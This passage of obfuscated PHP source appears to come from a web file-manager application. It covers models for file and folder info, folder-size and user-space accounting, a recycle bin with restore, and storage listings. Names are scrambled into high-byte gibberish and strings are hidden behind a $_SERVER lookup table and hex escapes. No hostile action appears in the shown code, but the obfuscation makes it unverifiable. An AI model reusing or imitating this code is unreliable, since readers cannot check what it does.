$this->sourceInfo($ášäÈá); if (!$öş£äÆë || $öş£äÆë[$¬ê“ñ£•[405]]) { return !1; } $Úñ¨şªŸ = $¬ê“ñ£•[467] . $öş£äÆë[$¬ê“ñ£•[461]]; $ğ€Ê¦ = _get(self::$cacheFileInfo, $Úñ¨şªŸ); if ($ğ€Ê¦) { return $ğ€Ê¦; } $Ş­ö®úÁ = Model($¬ê“ñ£•[464])->fileInfo($öş£äÆë[$¬ê“ñ£•[461]]); if ($Ş­ö®úÁ) { $Ş­ö®úÁ[$¬ê“ñ£•[28]] = $öş£äÆë[$¬ê“ñ£•[28]]; } self::$cacheFileInfo[$Úñ¨şªŸ] = $Ş­ö®úÁ; return $Ş­ö®úÁ; } private function folderChildrenNumber($Ã‡ÛÚ·) { $ÍŸ‰Ùğ =& $_SERVER[¥ÙÌÜ¾ê]; $¯ï²ˆŸ = $this->sourceInfo($Ã‡ÛÚ·); $ù†æÕõ– = array($ÍŸ‰Ùğ[578] => array($ÍŸ‰Ùğ[538], $¯ï²ˆŸ[$ÍŸ‰Ùğ[515]] . $Ã‡ÛÚ· . $ÍŸ‰Ùğ[539]), $ÍŸ‰Ùğ[424] => intval($¯ï²ˆŸ[$ÍŸ‰Ùğ[425]]), $ÍŸ‰Ùğ[571] => 1); $äÕ„ğÍ = $this->where($ù†æÕõ–)->count(); $ĞÜîÚ¸ = $this->where($ù†æÕõ–)->where(array($ÍŸ‰Ùğ[571] => 0))->count(); return array($ÍŸ‰Ùğ[82] => $ĞÜîÚ¸, $ÍŸ‰Ùğ[83] => $äÕ„ğÍ); } public function pathInfo($¿Š´ÇŞ›, $÷’ı‹ıÄ = false) { $Ô‡¹İè =& $_SERVER[¥ÙÌÜ¾ê]; $÷’ı‹ıÄ = !1; $¿Š´ÇŞ› = intval($¿Š´ÇŞ›); $¿¸÷˜¹¸ = $Ô‡¹İè[453] . intval($÷’ı‹ıÄ) . $Ô‡¹İè[454] . $¿Š´ÇŞ›; $ûÀÀßÖî = _get(self::$cachePathInfo, $¿¸÷˜¹¸); if ($ûÀÀßÖî) { return $ûÀÀßÖî; } $ˆ›ÀñÌ = $this->sourceInfo($¿Š´ÇŞ›); if (!$ˆ›ÀñÌ) { return !1; } $ˆ›ÀñÌ = $this->_listDataApplyItem($ˆ›ÀñÌ, $÷’ı‹ıÄ); self::$cachePathInfo[$¿¸÷˜¹¸] = $ˆ›ÀñÌ; return $ˆ›ÀñÌ; } public static $cachePathInfoMore = array(); public function pathInfoMore($àŞ½ß¿Æ) { $÷á­‹©Ó =& $_SERVER[¥ÙÌÜ¾ê]; $Ø¸ˆ«åÚ = _get(self::$cachePathInfoMore, $àŞ½ß¿Æ); if ($Ø¸ˆ«åÚ) { return $Ø¸ˆ«åÚ; } $á°¹ã•é = $this->pathInfo($àŞ½ß¿Æ); if (!$á°¹ã•é) { return !1; } if ($á°¹ã•é[$÷á­‹©Ó[405]] == $÷á­‹©Ó[87]) { $á°¹ã•é[$÷á­‹©Ó[81]] = $this->folderChildrenNumber($àŞ½ß¿Æ); } self::$cachePathInfoMore[$àŞ½ß¿Æ] = $á°¹ã•é; return $á°¹ã•é; } public function sourceInfo($¬ªÙñÇ¹) { $ÖÅÅÌËÚ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$¬ªÙñÇ¹) { return array(); } $¬ªÙñÇ¹ = intval($¬ªÙñÇ¹); $å­Â×¢ = $ÖÅÅÌËÚ[452] . $¬ªÙñÇ¹; $· ±í®û = _get(self::$cacheSourceInfo, $å­Â×¢); if ($· ±í®û) { return $· ±í®û; } $…Öºò‡Ô = $this->where(array($ÖÅÅÌËÚ[397] => $¬ªÙñÇ¹))->find(); self::$cacheSourceInfo[$å­Â×¢] = $…Öºò‡Ô; return self::$cacheSourceInfo[$å­Â×¢]; } public function sourceCacheClear($‡¯—Í‹Á = false) { self::cacheClear($‡¯—Í‹Á); } public static function cacheClear($ÏÏ—Î– = false) { $úô³ûóŸ =& $_SERVER[¥ÙÌÜ¾ê]; if ($ÏÏ—Î– == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$úô³ûóŸ[452] . $ÏÏ—Î–]); unset(self::$cachePathInfoMore[$ÏÏ—Î–]); unset(self::$cachePathInfo[$úô³ûóŸ[2038] . $ÏÏ—Î–]); unset(self::$cachePathInfo[$úô³ûóŸ[2039] . $ÏÏ—Î–]); } public function metaSet($×İË÷Ã, $“£¾ñ—¹ = null, $ø©­ô¸ñ = null) { $¤çÜ¬õ› = parent::metaSet($×İË÷Ã, $“£¾ñ—¹, $ø©­ô¸ñ); if ($¤çÜ¬õ›) { $this->sourceCacheClear($×İË÷Ã); } return $¤çÜ¬õ›; } public function pathInfoByPath($·ÙôûÆ¬, $ìÚİ¸) { $‹Ş¨ëÀ÷ =& $_SERVER[¥ÙÌÜ¾ê]; $ï¿ó–„ú = !$ìÚİ¸ ? array() : explode($‹Ş¨ëÀ÷[8], trim($ìÚİ¸, $‹Ş¨ëÀ÷[8])); $Ÿàˆúõ = $·ÙôûÆ¬; foreach ($ï¿ó–„ú as $Ô—‚¬¥®) { $”‚Šø˜ = array($‹Ş¨ëÀ÷[492] => $Ÿàˆúõ, $‹Ş¨ëÀ÷[28] => $Ô—‚¬¥®); $ë®¶¸ƒ¢ = $this->where($”‚Šø˜)->select(); if (!$ë®¶¸ƒ¢) { return !1; } $ë®¶¸ƒ¢ = array_sort_by($ë®¶¸ƒ¢, $‹Ş¨ëÀ÷[425]); $Ÿàˆúõ = $ë®¶¸ƒ¢[0][$‹Ş¨ëÀ÷[397]]; } return $this->pathInfo($Ÿàˆúõ, !0); } protected function updateModifyTime($Ï€’‰”•) { $Œ¶‘Ùî© =& $_SERVER[¥ÙÌÜ¾ê]; $ø¶«çû = defined($Œ¶‘Ùî©[468]) ? USER_ID : $Œ¶‘Ùî©[191]; if (!$Ï€’‰”•) { return; } if (!is_array($Ï€’‰”•)) { $Ï€’‰”• = array($Ï€’‰”•); } foreach ($Ï€’‰”• as $„Ÿ¶¬û => $–Å˜÷äÂ) { $Ï€’‰”•[$„Ÿ¶¬û] = intval($–Å˜÷äÂ); $this->sourceCacheClear($–Å˜÷äÂ); } $óïÎ»ˆ = array($Œ¶‘Ùî©[397] => array($Œ¶‘Ùî©[7], $Ï€’‰”•)); $›©Ê¢“› = array($Œ¶‘Ùî©[577] => $ø¶«çû, $Œ¶‘Ùî©[419] => time()); $this->where($óïÎ»ˆ)->save($›©Ê¢“›); } public function folderSizeReset($£¿Œ×Ü®, $É”Ö¶‹è = false) { $êˆ“áØÒ =& $_SERVER[¥ÙÌÜ¾ê]; if ($this->statusIgnoreResetSpace) { return; } $Ò§Í˜Ê = $this->sourceInfo($£¿Œ×Ü®); $¾Öï˜ˆ¾ = $êˆ“áØÒ[2040] . $£¿Œ×Ü®; CacheLock::lock($¾Öï˜ˆ¾, 20); if ($É”Ö¶‹è === !1) { $this->sourceCacheClear($£¿Œ×Ü®); $Ò§Í˜Ê = $this->sourceInfo($£¿Œ×Ü®); $ÈªÌé±¦ = array($êˆ“áØÒ[396] => $£¿Œ×Ü®, $êˆ“áØÒ[424] => 0); $ÜŸÏ“ = $this->where($ÈªÌé±¦)->sum($êˆ“áØÒ[78]); $É”Ö¶‹è = intval($ÜŸÏ“) - intval($Ò§Í˜Ê[$êˆ“áØÒ[78]]); } if ($É”Ö¶‹è == 0) { return CacheLock::unlock($¾Öï˜ˆ¾); } $Ñ ã¿§× = $this->parentLevelArray($Ò§Í˜Ê[$êˆ“áØÒ[515]]); if (!$Ñ ã¿§×) { $Ñ ã¿§× = array(); } $Ñ ã¿§×[] = $Ò§Í˜Ê[$êˆ“áØÒ[397]]; $ÈªÌé±¦ = array($êˆ“áØÒ[397] => array($êˆ“áØÒ[413], $Ñ ã¿§×)); if ($É”Ö¶‹è < 0) { $ÈªÌé±¦[$êˆ“áØÒ[78]] = array($êˆ“áØÒ[1011], abs($É”Ö¶‹è)); } $this->where($ÈªÌé±¦)->setAdd($êˆ“áØÒ[78], $É”Ö¶‹è); CacheLock::unlock($¾Öï˜ˆ¾); $š¯å–•¶ = $êˆ“áØÒ[2041] . $Ò§Í˜Ê[$êˆ“áØÒ[406]] . $êˆ“áØÒ[4] . $Ò§Í˜Ê[$êˆ“áØÒ[498]]; $ÔÚò›ËÆ = array($Ò§Í˜Ê[$êˆ“áØÒ[406]], $Ò§Í˜Ê[$êˆ“áØÒ[498]]); TaskRun::timeLimitCall($š¯å–•¶, $êˆ“áØÒ[2042], $ÔÚò›ËÆ, 1.5); } public function folderSizeResetChildren($–Æ…ÇÈ¡) { $à©ıß¿ =& $_SERVER[¥ÙÌÜ¾ê]; $this->sourceCacheClear($–Æ…ÇÈ¡); $¤–Ïö¸ = $this->sourceInfo($–Æ…ÇÈ¡); $û«ÔÊ“Ü = array($à©ıß¿[571] => 1, $à©ıß¿[578] => array($à©ıß¿[538], $¤–Ïö¸[$à©ıß¿[515]] . $–Æ…ÇÈ¡ . $à©ıß¿[539])); $ÖĞÆ–ğ” = $à©ıß¿[2043]; $ ü¸Å­ = $this->field($ÖĞÆ–ğ”)->where($û«ÔÊ“Ü)->select(); $û«ÔÊ“Ü[$à©ıß¿[405]] = 0; $‹ÕŒ İÜ = $this->field($ÖĞÆ–ğ”)->where($û«ÔÊ“Ü)->select(); if (!$‹ÕŒ İÜ) { return; } $ ü¸Å­[] = $¤–Ïö¸; $ ü¸Å­ = array_to_keyvalue($ ü¸Å­, $à©ıß¿[397]); foreach ($ ü¸Å­ as $§ğ‚Ğ‚‡ => $Âóéò¥) { $ ü¸Å­[$§ğ‚Ğ‚‡][$à©ıß¿[2044]] = $ ü¸Å­[$§ğ‚Ğ‚‡][$à©ıß¿[78]]; $ ü¸Å­[$§ğ‚Ğ‚‡][$à©ıß¿[78]] = 0; } foreach ($‹ÕŒ İÜ as $Âóéò¥) { $Å®²åÃì = $Âóéò¥[$à©ıß¿[492]] . $à©ıß¿[33]; if (!isset($ ü¸Å­[$Å®²åÃì])) { continue; } if ($Âóéò¥[$à©ıß¿[425]] == $ ü¸Å­[$Å®²åÃì][$à©ıß¿[425]]) { $ ü¸Å­[$Å®²åÃì][$à©ıß¿[78]] += $Âóéò¥[$à©ıß¿[78]]; } } foreach ($ ü¸Å­ as $Âóéò¥) { $•¡ú¨ÃÑ = $this->parentLevelArray($Âóéò¥[$à©ıß¿[515]]); foreach ($•¡ú¨ÃÑ as $Å®²åÃì) { $Å®²åÃì = $Å®²åÃì . $à©ıß¿[33]; if (!isset($ ü¸Å­[$Å®²åÃì])) { continue; } if ($Âóéò¥[$à©ıß¿[425]] == $ ü¸Å­[$Å®²åÃì][$à©ıß¿[425]]) { $ ü¸Å­[$Å®²åÃì][$à©ıß¿[78]] += $Âóéò¥[$à©ıß¿[78]]; } } } $ß‚Êïå = array(); foreach ($ ü¸Å­ as $Âóéò¥) { if ($Âóéò¥[$à©ıß¿[78]] == $Âóéò¥[$à©ıß¿[2044]]) { continue; } $ß‚Êïå[] = array($à©ıß¿[397], $Âóéò¥[$à©ıß¿[397]], $à©ıß¿[78], $Âóéò¥[$à©ıß¿[78]]); } $this->saveAll($ß‚Êïå); } public function userSpaceReset($âÜìüÇİ = false) { $‰ÍšÚ¶Û =& $_SERVER[¥ÙÌÜ¾ê]; $íÍ£ ¾Ç = $this->where(array($‰ÍšÚ¶Û[406] => self::TYPE_USER, $‰ÍšÚ¶Û[498] => $âÜìüÇİ, $‰ÍšÚ¶Û[405] => 0))->sum($‰ÍšÚ¶Û[78]); $íÍ£ ¾Ç = !$íÍ£ ¾Ç || $íÍ£ ¾Ç <= 0 ? 0 : $íÍ£ ¾Ç; Model($‰ÍšÚ¶Û[507])->userEdit($âÜìüÇİ, array($‰ÍšÚ¶Û[1737] => $íÍ£ ¾Ç)); } public function targetSpaceUpdate($Ö±êÚİœ, $©Æ§¸¼¡) { $ŸëËà  =& $_SERVER[¥ÙÌÜ¾ê]; if (!$©Æ§¸¼¡) { return; } if (!in_array($Ö±êÚİœ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $«©Âè¥Á = $this->targetSpaceSize($Ö±êÚİœ, $©Æ§¸¼¡); if ($Ö±êÚİœ == self::TYPE_USER) { Model($ŸëËà [507])->userEdit($©Æ§¸¼¡, array($ŸëËà [1737] => $«©Âè¥Á)); } else { if ($Ö±êÚİœ == self::TYPE_GROUP) { Model($ŸëËà [516])->groupEdit($©Æ§¸¼¡, array($ŸëËà [1737] => $«©Âè¥Á)); } } } public function targetSpaceSize($Ô©Ìºæ, $æÍøÙÉŸ) { $…ÌÓĞŠç =& $_SERVER[¥ÙÌÜ¾ê]; $ç‘Ø³éö = $this->sourceRoot($Ô©Ìºæ, $æÍøÙÉŸ, !0); if (!$ç‘Ø³éö) { return 0; } $œüø¶Ïä = floatval($ç‘Ø³éö[$…ÌÓĞŠç[78]]); $™íÔúğ = array($…ÌÓĞŠç[578] => array($…ÌÓĞŠç[538], $…ÌÓĞŠç[525] . $ç‘Ø³éö[$…ÌÓĞŠç[397]] . $…ÌÓĞŠç[539])); $ùÓÈÕÁ£ = Model($…ÌÓĞŠç[423])->field($…ÌÓĞŠç[412])->where($™íÔúğ)->select(); $ùÓÈÕÁ£ = array_to_keyvalue($ùÓÈÕÁ£, $…ÌÓĞŠç[33], $…ÌÓĞŠç[397]); $ùÓÈÕÁ£ = array_unique(array_filter($ùÓÈÕÁ£)); if ($ùÓÈÕÁ£) { $™íÔúğ = array($…ÌÓĞŠç[412] => array($…ÌÓĞŠç[413], $ùÓÈÕÁ£)); $œüø¶Ïä += floatval($this->where($™íÔúğ)->sum($…ÌÓĞŠç[78])); } $œüø¶Ïä = !$œüø¶Ïä || $œüø¶Ïä <= 0 ? 0 : $œüø¶Ïä; return $œüø¶Ïä; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Å¥»ìğ¶) { return $this->fileTypeProfile($Å¥»ìğ¶, SourceModel::TYPE_USER); } public function groupFileTypeProfile($§îÉ…Ãƒ) { return $this->fileTypeProfile($§îÉ…Ãƒ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ıÏåª®, $æ´ˆ»õï) { $Ï¶ûşóë =& $_SERVER[¥ÙÌÜ¾ê]; $Ğùğ´ë = $Ï¶ûşóë[2045] . $ıÏåª® . $Ï¶ûşóë[71] . $æ´ˆ»õï; $è®É¸áé = Cache::get($Ğùğ´ë); if ($è®É¸áé) { return $è®É¸áé; } $´ñëƒà‰ = array($Ï¶ûşóë[571] => 0); if ($ıÏåª® != !1) { $´ñëƒà‰[$Ï¶ûşóë[498]] = $ıÏåª®; $´ñëƒà‰[$Ï¶ûşóë[406]] = $æ´ˆ»õï; } $ÆÚ¡¾¼ú = array(); $ÆÚ¡¾¼ú[$Ï¶ûşóë[2046]] = array($Ï¶ûşóë[2047] => LNG($Ï¶ûşóë[2046]), $Ï¶ûşóë[2048] => $this->where($´ñëƒà‰)->count(), $Ï¶ûşóë[573] => $this->where($´ñëƒà‰)->sum($Ï¶ûşóë[78])); $ºø¦íŒ = KodIO::fileTypeList(); foreach ($ºø¦íŒ as $Â»Ş¾°î => $Ô£¦ı»¯) { $´ñëƒà‰[$Ï¶ûşóë[407]] = $this->fileTypeWhere($Â»Ş¾°î); $ÆÚ¡¾¼ú[$Â»Ş¾°î] = array($Ï¶ûşóë[2047] => $Ô£¦ı»¯[$Ï¶ûşóë[28]], $Ï¶ûşóë[2048] => $this->where($´ñëƒà‰)->count(), $Ï¶ûşóë[573] => $this->where($´ñëƒà‰)->sum($Ï¶ûşóë[78])); } Cache::set($Ğùğ´ë, $ÆÚ¡¾¼ú, 1200); return $ÆÚ¡¾¼ú; } public function fileNameExist($…±µ˜À‹, $ş„ŸìÁä) { $«»©øœÌ =& $_SERVER[¥ÙÌÜ¾ê]; $êæœê«ª = $this->where(array($«»©øœÌ[492] => $…±µ˜À‹, $«»©øœÌ[28] => $ş„ŸìÁä, $«»©øœÌ[425] => 0))->find(); return is_array($êæœê«ª) ? $êæœê«ª[$«»©øœÌ[397]] : !1; } public function childList($ûÁ½İ”©) { $ˆ’¶´¯ =& $_SERVER[¥ÙÌÜ¾ê]; $š¸ï—ºÒ = $ˆ’¶´¯[2023] . $ûÁ½İ”©; if (isset(self::$cacheChildList[$š¸ï—ºÒ])) { return self::$cacheChildList[$š¸ï—ºÒ]; } $ÚİñÌ› = array($ˆ’¶´¯[492] => intval($ûÁ½İ”©), $ˆ’¶´¯[425] => 0); $¸Ğ‚àñ° = $this->where($ÚİñÌ›)->select(); $¸Ğ‚àñ° = $¸Ğ‚àñ° ? $¸Ğ‚àñ° : array(); self::$cacheChildList[$š¸ï—ºÒ] = $¸Ğ‚àñ°; foreach ($¸Ğ‚àñ° as $é£µ»è) { $š¸ï—ºÒ = $ˆ’¶´¯[452] . $é£µ»è[$ˆ’¶´¯[397]]; self::$cacheSourceInfo[$š¸ï—ºÒ] = $é£µ»è; } return $¸Ğ‚àñ°; } public function fileNameAuto($ıœØ„Ù¸, $İ´‡Ó“», $Ó”®Îåä = REPEAT_RENAME, $ä˜¨‰ğ® = false) { $Ã·¨ÏëÈ =& $_SERVER[¥ÙÌÜ¾ê]; $¼ƒíÍù› = array($Ã·¨ÏëÈ[492] => $ıœØ„Ù¸, $Ã·¨ÏëÈ[425] => 0, $Ã·¨ÏëÈ[28] => array($Ã·¨ÏëÈ[381], $İ´‡Ó“» . $Ã·¨ÏëÈ[382])); $ß¾ãÄğ = $this->field($Ã·¨ÏëÈ[28])->where($¼ƒíÍù›)->select(); $Ã³üêŞœ = array_to_keyvalue($ß¾ãÄğ, $Ã·¨ÏëÈ[33], $Ã·¨ÏëÈ[28]); return $this->fileNameAutoGet($Ã³üêŞœ, $İ´‡Ó“», $Ó”®Îåä, $ä˜¨‰ğ®); } public function fileNameAutoGet($ÆéŞª×¶, $ôÜÑğ¶º, $´–óºß‰, $ˆ£¹³÷¼) { $ÇàÆ½¨£ =& $_SERVER[¥ÙÌÜ¾ê]; if ($´–óºß‰ == REPEAT_REPLACE || !$ÆéŞª×¶ || !in_array_not_case($ôÜÑğ¶º, $ÆéŞª×¶) || $ˆ£¹³÷¼ && $´–óºß‰ != REPEAT_RENAME_FOLDER) { return $ôÜÑğ¶º; } if ($´–óºß‰ == REPEAT_SKIP) { return !1; } $¶Œç¬Î = $ÇàÆ½¨£[95] . get_path_ext($ôÜÑğ¶º); $¶Œç¬Î = $¶Œç¬Î == $ÇàÆ½¨£[95] || $ˆ£¹³÷¼ ? $ÇàÆ½¨£[33] : $¶Œç¬Î; for ($ì ÆÏË = 1; $ì ÆÏË <= count($ÆéŞª×¶) + 1; $ì ÆÏË++) { $áœ™ó» = substr($ôÜÑğ¶º, 0, strlen($ôÜÑğ¶º) - strlen($¶Œç¬Î)); $ƒ§çÂ¨· = $áœ™ó» . "\x28{$ì ÆÏË}\x29{$¶Œç¬Î}"; if (!in_array_not_case($ƒ§çÂ¨·, $ÆéŞª×¶)) { return $ƒ§çÂ¨·; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\x75\162\143\145\x5f\162\145\143\x79\x63\154\145"; protected $dataAuto = array(array("\x63\162\x65\x61\x74\x65\x54\151\x6d\145", "\x74\x69\x6d\x65", "\151\x6e\163\145\162\x74", "\146\165\156\x63\164\x69\157\x6e")); public function listData($²›È£§å = false) { $Ë® ƒøú =& $_SERVER[¥ÙÌÜ¾ê]; $²›È£§å = $²›È£§å ? $²›È£§å : USER_ID; $ªÎÕÈıÙ = $this->where(array($Ë® ƒøú[1572] => $²›È£§å))->select(); return array_to_keyvalue($ªÎÕÈıÙ, $Ë® ƒøú[33], $Ë® ƒøú[397]); } public function moveToRecycle($±ù»éÖ) { $”îîÙ€® =& $_SERVER[¥ÙÌÜ¾ê]; $Øô¥´©Æ = Model($”îîÙ€®[1253]); $…–õâáª = $Øô¥´©Æ->sourceInfo($±ù»éÖ); if (!$…–õâáª || $…–õâáª[$”îîÙ€®[425]] == $”îîÙ€®[87]) { return; } $Ü¡ô¬Ëô = array($”îîÙ€®[412] => $±ù»éÖ, $”îîÙ€®[1572] => USER_ID, $”îîÙ€®[574] => $…–õâáª[$”îîÙ€®[406]], $”îîÙ€®[575] => $…–õâáª[$”îîÙ€®[498]], $”îîÙ€®[578] => $…–õâáª[$”îîÙ€®[515]]); $this->add($Ü¡ô¬Ëô); $this->recycleMove($±ù»éÖ, 1); if ($…–õâáª[$”îîÙ€®[405]] == $”îîÙ€®[87]) { $’Õ´œ‚ƒ = array($”îîÙ€®[578] => array($”îîÙ€®[538], $…–õâáª[$”îîÙ€®[515]] . $±ù»éÖ . $”îîÙ€®[539])); $Øô¥´©Æ->where($’Õ´œ‚ƒ)->setField($”îîÙ€®[425], 1); } } public function clear() { $this->remove(!1); } public function remove($ÛëìÏ·È = false, $óÑÏ¸øˆ = false) { $ÕÚ´¬Í˜ =& $_SERVER[¥ÙÌÜ¾ê]; $óÑÏ¸øˆ = $óÑÏ¸øˆ ? $óÑÏ¸øˆ : USER_ID; $£É¯£ñÔ = Model($ÕÚ´¬Í˜[1253]); $õ«ö®úò = $this->listData($óÑÏ¸øˆ); $ÛëìÏ·È = $ÛëìÏ·È === !1 ? !1 : $ÛëìÏ·È; $Ê˜ÛÙÎÓ = array(); foreach ($õ«ö®úò as $î¿á‹½) { if ($ÛëìÏ·È != !1 && !in_array($î¿á‹½, $ÛëìÏ·È)) { continue; } $›Õ„À¸Ì = $£É¯£ñÔ->sourceInfo($î¿á‹½); $£É¯£ñÔ->remove($î¿á‹½, !1); $‘§±Á”” = $›Õ„À¸Ì[$ÕÚ´¬Í˜[406]] . $ÕÚ´¬Í˜[71] . $›Õ„À¸Ì[$ÕÚ´¬Í˜[498]]; $Ê˜ÛÙÎÓ[$‘§±Á””] = array($ÕÚ´¬Í˜[574] => $›Õ„À¸Ì[$ÕÚ´¬Í˜[406]], $ÕÚ´¬Í˜[498] => $›Õ„À¸Ì[$ÕÚ´¬Í˜[498]]); $this->where(array($ÕÚ´¬Í˜[397] => $î¿á‹½))->delete(); } foreach ($Ê˜ÛÙÎÓ as $¡Ş€¶öÉ) { $£É¯£ñÔ->targetSpaceUpdate($¡Ş€¶öÉ[$ÕÚ´¬Í˜[406]], $¡Ş€¶öÉ[$ÕÚ´¬Í˜[498]]); } } public function restore($ÒÆ÷¬÷… = false) { $½÷‰¤ = $this->listData(); $this->_restoreSource($½÷‰¤, $ÒÆ÷¬÷…); } public function removeUserAll($ï„ï‚ß») { $this->remove(!1, $ï„ï‚ß»); } private function _restoreSource($í©“ø‰¡, $š­»¾ØÏ) { $ÈîÉÇİ” =& $_SERVER[¥ÙÌÜ¾ê]; $—ÌÆ“àŞ = Model($ÈîÉÇİ”[1253]); $š­»¾ØÏ = $š­»¾ØÏ == !1 ? !1 : $š­»¾ØÏ; if (!$í©“ø‰¡) { return !0; } $“„é»İ› = array(); foreach ($í©“ø‰¡ as $™Ñı”ğ¡) { if ($š­»¾ØÏ != !1 && !in_array($™Ñı”ğ¡, $š­»¾ØÏ)) { continue; } $ó£¤Æç = $—ÌÆ“àŞ->sourceInfo($™Ñı”ğ¡); $š®‹¿ôÙ = $—ÌÆ“àŞ->sourceInfo($ó£¤Æç[$ÈîÉÇİ”[492]]); if ($š®‹¿ôÙ[$ÈîÉÇİ”[425]] == $ÈîÉÇİ”[87]) { continue; } $—ÌÆ“àŞ->lockMoveStart($™Ñı”ğ¡); $this->recycleMove($™Ñı”ğ¡, 0); if ($ó£¤Æç[$ÈîÉÇİ”[405]] == $ÈîÉÇİ”[87]) { $ˆÑ¢ú«… = array($ÈîÉÇİ”[578] => array($ÈîÉÇİ”[538], $ó£¤Æç[$ÈîÉÇİ”[515]] . $™Ñı”ğ¡ . $ÈîÉÇİ”[539])); $—ÌÆ“àŞ->where($ˆÑ¢ú«…)->setField($ÈîÉÇİ”[425], 0); $this->restoreFolderChildren($™Ñı”ğ¡, $í©“ø‰¡); } $this->where(array($ÈîÉÇİ”[397] => $™Ñı”ğ¡))->delete(); $—ÌÆ“àŞ->folderSizeReset($ó£¤Æç[$ÈîÉÇİ”[492]]); $“„é»İ›[] = $ó£¤Æç[$ÈîÉÇİ”[492]]; if ($ó£¤Æç[$ÈîÉÇİ”[405]] == $ÈîÉÇİ”[87]) { $“„é»İ›[] = $™Ñı”ğ¡; } $—ÌÆ“àŞ->lockMoveEnd($™Ñı”ğ¡); } $—ÌÆ“àŞ->updateModifyTime($“„é»İ›); } private function restoreFolderChildren($¹÷ù¤¨, $ûéê¹ûÒ) { $Ú‚€Ã¸î =& $_SERVER[¥ÙÌÜ¾ê]; $Ã­Øô†ô = Model($Ú‚€Ã¸î[1253]); $ç¶Ù•¹ = array($Ú‚€Ã¸î[397] => array($Ú‚€Ã¸î[7], array())); foreach ($ûéê¹ûÒ as $ìÂ Å–˜) { if ($ìÂ Å–˜ == $¹÷ù¤¨) { continue; } if (!$Ã­Øô†ô->isParentOf($¹÷ù¤¨, $ìÂ Å–˜)) { continue; } $¥©œÕû­ = $Ã­Øô†ô->sourceInfo($ìÂ Å–˜); if ($¥©œÕû­[$Ú‚€Ã¸î[405]] == $Ú‚€Ã¸î[87]) { $ç¶Ù•¹[] = array($Ú‚€Ã¸î[578] => array($Ú‚€Ã¸î[538], $¥©œÕû­[$Ú‚€Ã¸î[515]] . $ìÂ Å–˜ . $Ú‚€Ã¸î[539])); } else { $ç¶Ù•¹[$Ú‚€Ã¸î[397]][1][] = $ìÂ Å–˜; } } if (!$ç¶Ù•¹[$Ú‚€Ã¸î[397]][1]) { unset($ç¶Ù•¹[$Ú‚€Ã¸î[397]]); } if (!$ç¶Ù•¹) { return; } $ç¶Ù•¹[$Ú‚€Ã¸î[397]][1] = array_unique($ç¶Ù•¹[$Ú‚€Ã¸î[397]][1]); $ç¶Ù•¹[$Ú‚€Ã¸î[996]] = $Ú‚€Ã¸î[1844]; $Ã­Øô†ô->where($ç¶Ù•¹)->setField($Ú‚€Ã¸î[425], 1); } private function recycleMove($°ò”î, $ŸôÃÁ Õ = 1) { $ØÊÈá—® =& $_SERVER[¥ÙÌÜ¾ê]; $±’†¥”™ = Model($ØÊÈá—®[1253]); $€‡ÓÌ»ş = Model($ØÊÈá—®[2049]); $ìĞİˆ¨ = array($ØÊÈá—®[397] => $°ò”î); if ($ŸôÃÁ Õ) { $±’†¥”™->where($ìĞİˆ¨)->setField($ØÊÈá—®[425], 1); $€‡ÓÌ»ş->eventRecycle($°ò”î, $ØÊÈá—®[2050]); } else { $î€ìã°Ñ = $±’†¥”™->where($ìĞİˆ¨)->find(); $ÄÆ¥ËãÑ = $î€ìã°Ñ[$ØÊÈá—®[405]] == $ØÊÈá—®[87]; $¦ğÂÙ“À = $±’†¥”™->fileNameAuto($î€ìã°Ñ[$ØÊÈá—®[492]], $î€ìã°Ñ[$ØÊÈá—®[28]], REPEAT_RENAME_FOLDER, $ÄÆ¥ËãÑ); if ($¦ğÂÙ“À != $î€ìã°Ñ[$ØÊÈá—®[28]]) { $±’†¥”™->rename($°ò”î, $¦ğÂÙ“À); } $±’†¥”™->where($ìĞİˆ¨)->setField($ØÊÈá—®[425], 0); $€‡ÓÌ»ş->eventRecycle($°ò”î, $ØÊÈá—®[2051]); } } } goto fá­ó†ÛíŒ; fá­ó†ÛíŒ: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\163\x6f\x75\x72\x63\x65\123\145\x63\x72\145\164\114\x69\x73\164"; public $field = array("\163\157\x75\x72\143\x65\111\104", "\164\171\160\145\x49\x44", "\x63\x72\145\x61\x74\x65\x55\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\x73\x74\x6f\162\141\x67\x65\114\x69\163\x74"; public $field = array("\x6e\141\155\145", "\x73\151\x7a\145\115\141\x78", "\163\x79\163\164\145\155", "\x64\x65\146\141\165\154\164", "\x64\162\151\166\145\162", "\x63\157\156\146\151\147"); public function listData($Û‡àáÀ = false, $ºËÈ±Î¶ = "\x6d\157\144\x69\146\171\124\151\x6d\x65", $Ç°—«êÊ = false) { $ï÷ÊÓ¥ğ =& $_SERVER[¥ÙÌÜ¾ê]; $ÀóÁãó‹ = parent::listData($Û‡àáÀ, $ºËÈ±Î¶, $Ç°—«êÊ); if ($Û‡àáÀ) { return $ÀóÁãó‹; } $—ââĞ»ó = $this->ioSizeUseGet(array_to_keyvalue($ÀóÁãó‹, $ï÷ÊÓ¥ğ[33], $ï÷ÊÓ¥ğ[395])); foreach ($ÀóÁãó‹ as $ŠÜ£‹‰ => $òéìâÏ¢) { unset($ÀóÁãó‹[$ŠÜ£‹‰][$ï÷ÊÓ¥ğ[6]]); $ÀóÁãó‹[$ŠÜ£‹‰][$ï÷ÊÓ¥ğ[1737]] = isset($—ââĞ»ó[$òéìâÏ¢[$ï÷ÊÓ¥ğ[395]]]) ? $—ââĞ»ó[$òéìâÏ¢[$ï÷ÊÓ¥ğ[395]]] : 0; } return $ÀóÁãó‹; } public function ioSizeUseGet($À§ùÏª°) { $‰‚’¥åª =& $_SERVER[¥ÙÌÜ¾ê]; if (!$À§ùÏª°) { return array(); } $™§°·Á† = $‰‚’¥åª[2052] . implode($‰‚’¥åª[47], $À§ùÏª°); $Â­û€Äî = Cache::get($™§°·Á†); if ($Â­û€Äî) { return $Â­û€Äî; } $°Ä˜«ñÂ = array($‰‚’¥åª[817] => $‰‚’¥åª[395], 